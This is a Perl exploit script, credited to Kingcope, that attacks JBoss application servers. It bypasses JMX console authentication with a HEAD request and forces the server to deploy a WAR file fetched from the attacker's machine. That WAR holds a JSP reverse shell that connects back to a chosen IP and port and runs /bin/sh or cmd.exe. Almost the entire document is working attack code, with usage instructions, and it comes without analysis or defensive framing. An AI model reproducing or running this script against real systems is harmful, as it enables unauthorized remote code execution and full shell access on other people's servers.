#JBoss AS Remote Exploit v2 (with auth bypass)
#by Kingcope
#####

use IO::Socket;
use LWP::UserAgent;
use URI::Escape;
use MIME::Base64;
use IO::Compress::Zip qw(zip $ZipError) ;
use HTTP::Daemon;
use HTTP::Status;
use threads;
use threads::shared;

sub usage {
	print "JBoss AS Remote Exploit (JBoss JMX Console Deployer Upload and Execute)\nby Kingcope\n\nusage: perl daytona.pl <target> <targetport> <yourip> <yourport> <win/lnx>\n";
	print "example: perl daytona.pl 192.168.2.10 8080 192.168.2.2 443 lnx\n";
	exit;
}

if ($#ARGV != 4) { usage; }

$host = $ARGV[0];
$port = $ARGV[1];
$myip = $ARGV[2];
$myport = $ARGV[3];
$com = $ARGV[4];

if ($com eq "lnx") {
	$comspec = "/bin/sh";
}

if ($com eq "win") {
	$comspec = "cmd.exe";
}

$|=1;

$jsp="
<%@
page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"
%>
			<%!
				static class StreamConnector extends Thread
				{
					InputStream is;
					OutputStream os;

					StreamConnector( InputStream is, OutputStream os )
					{
						this.is = is;
						this.os = os;
					}

					public void run()
					{
						BufferedReader in  = null;
						BufferedWriter out = null;
						try
						{
							in  = new BufferedReader( new InputStreamReader( this.is ) );
							out = new BufferedWriter( new OutputStreamWriter( this.os ) );
							char buffer[] = new char[8192];
							int length;
							while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
							{
								out.write( buffer, 0, length );
								out.flush();
							}
						} catch( Exception e ){}
						try
						{
							if( in != null )
								in.close();
							if( out != null )
								out.close();
						} catch( Exception e ){}
					}
				}
			%>
			<%
				try
				{
					Socket socket = new Socket( \"$myip\", $myport );
					Process process = Runtime.getRuntime().exec( \"$comspec\" );
					( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
					( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
				} catch( Exception e ) {}
			%>";

$manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n";

srand(time());

sub randstr
{
	my $length_of_randomstring=shift;

	my @chars=('a'..'z','A'..'Z');
	my $random_string;
	foreach (1..$length_of_randomstring) 
	{
		$random_string.=$chars[rand @chars];
	}
	return $random_string;
}

$appbase = randstr(8);
$jspname = randstr(8);

$webxml = "<?xml version=\"1.0\"?>
<!DOCTYPE web-app PUBLIC
 \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"
 \"http://java.sun.com/dtds/web-app_2_3.dtd\">
<web-app>
 <servlet>
  <servlet-name>$appbase</servlet-name>
  <jsp-file>/$jspname.jsp</jsp-file>
 </servlet>
</web-app>";

print "Creating war file\n";
open FILE, ">WAR/$jspname.jsp" || die "Could not create jsp for WAR, is there a WAR/ folder ?";
print FILE $jsp;
close FILE;

open FILE, ">WAR/META-INF/MANIFEST.MF" || die "Could not create MANIFEST.MF for WAR, is there a WAR/META-INF folder ?";
print FILE $manifest;
close FILE;

open FILE, ">WAR/WEB-INF/web.xml" || die "Could not create web.xml for WAR, is there a WAR/WEB-INF folder ?";
print FILE $webxml;
close FILE;

print "Compressing war file\n";
chdir "WAR";
zip [ "$jspname.jsp", "META-INF/MANIFEST.MF", "WEB-INF/web.xml"  ] => 'deploy.war'
        or die "zip failed: $ZipError\n";
chdir "..";

print "Cleaning up folders\n";

unlink("WAR/$jspname.jsp");
unlink("WAR/META-INF/MANIFEST.MF");
unlink("WAR/WEB-INF/web.xml");

# UPLOAD

$resource_uri = '/' . $appbase . '.war';
$port2 = 60000;
$service_url = 'http://' . $myip . ':' . $port2 . $resource_uri;

my $war_sent : shared = 1;

sub webserver {
print "Setting up webserver on port $port2\n";

  my $d = HTTP::Daemon->new(
           LocalAddr => '0.0.0.0',
           LocalPort => $port2,
       ) || die "\nERROR: Could not bind on port $port2\n";

  while (my $c = $d->accept) {
      while (my $r = $c->get_request) {
              $c->send_file_response("WAR/deploy.war");
              $war_sent = 1;
      }
      $c->close;
      undef($c);
  }
}
	$thr = threads->new(\&webserver);
	$thr->detach;

	sleep 1;
	
	$verb = "POST";
tryhead:	
	
	print "Forcing JBoss server to deploy $service_url\n";
	print "Trying $verb...\n";
	$params = "action=invokeOpByName&name=jboss.system:service=MainDeployer&methodName=deploy&argType=java.lang.String&arg0=$service_url";
	
	my $ua = LWP::UserAgent->new;
	$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.98 Safari/534.13");
	
	my $req;
	if ($verb eq "HEAD") {
	$req = HTTP::Request->new($verb => "http://$host:$port/jmx-console/HtmlAdaptor?$params");		
	} else {
	$req = HTTP::Request->new($verb => "http://$host:$port/jmx-console/HtmlAdaptor");
  	$req->content_type('application/x-www-form-urlencoded');
  	$req->content($params);
	  }
	  
    my $res = $ua->request($req);
    if (($res->is_success) || ($verb eq "HEAD" && ($res->status_line =~ /500/))) {
		print "$verb SUCCESS\n";
		print "Sending war file, please wait";
		for ($j=0;$j<30;$j++) {
			if ($war_sent == 1) {
				last;
			}
			sleep 1;
			print ".";
		}
		
		if ($war_sent == 0) {
			print "\nUNSUCCESSFULL, the webserver did not receive a request from the remote jboss.\n";
			exit;	
		}
		
		print "\nHIT!\nRequesting JSP file to trigger the connect back shell";
		$uri = '/' . $appbase . '/' . $jspname . '.jsp';
		print "\nURI = http://$host:$port$uri";
      	for ($k=0;$k<10;$k++) {
      		my $ua = LWP::UserAgent->new;
	  		$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.98 Safari/534.13");
	  		
	  		my $req = HTTP::Request->new(GET => "http://$host:$port$uri");
	  		my $res = $ua->request($req);

  			if ($res->is_success) {
	  			print "\nSUCCESS\n";
	  			exit;
  			} else {
		  		print ".";
#		        print $res->status_line."\n";

		  		sleep(5);
  			}
	  	}
        print "UNSUCCESSFUL\n";		
    } else {
	  print "$verb UNSUCCESSFUL\n";
	  if (($res->status_line =~ /401/) && ($verb ne "HEAD")) {
		print "UNAUTHORIZED, TRYING VERB 'HEAD'\n";
		$verb = "HEAD";
		goto tryhead;
	  }	       
    }

print "done.";